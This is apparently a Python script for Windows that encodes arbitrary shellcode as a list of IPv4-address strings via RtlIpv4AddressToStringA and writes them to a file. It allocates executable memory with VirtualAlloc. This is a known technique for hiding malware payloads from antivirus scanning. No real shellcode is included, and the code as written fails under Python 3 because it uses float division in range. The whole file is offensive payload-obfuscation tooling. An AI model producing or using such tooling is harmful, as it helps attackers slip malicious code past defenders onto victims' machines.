# coding = utf-8
import ctypes

#Input your shellcode like:\xfc\x48\x83\xe4\xf0\xe8\xxx
shellcode = b'Your shellcode'
ipv4 = ctypes.windll.kernel32.VirtualAlloc(0, len(shellcode)/4*15, 0x3000, 0x40)

for i in range(len(shellcode)/4):
    bytes_shellcode = shellcode[i*4:i*4+4]
    ctypes.windll.Ntdll.RtlIpv4AddressToStringA(bytes_shellcode, ipv4+i*15)

a = ctypes.string_at(ipv4, len(shellcode)*4-1)

l = []
for i in range(len(shellcode)/4):
    d = ctypes.string_at(ipv4+i*15, 15)
    l.append(d)

ipv4_shellcode = str(l).replace("'", "\"").replace(" ", "").replace("\r\n","")
with open("ipv4_shell.txt", "w+") as f:
    f.write(ipv4_shellcode)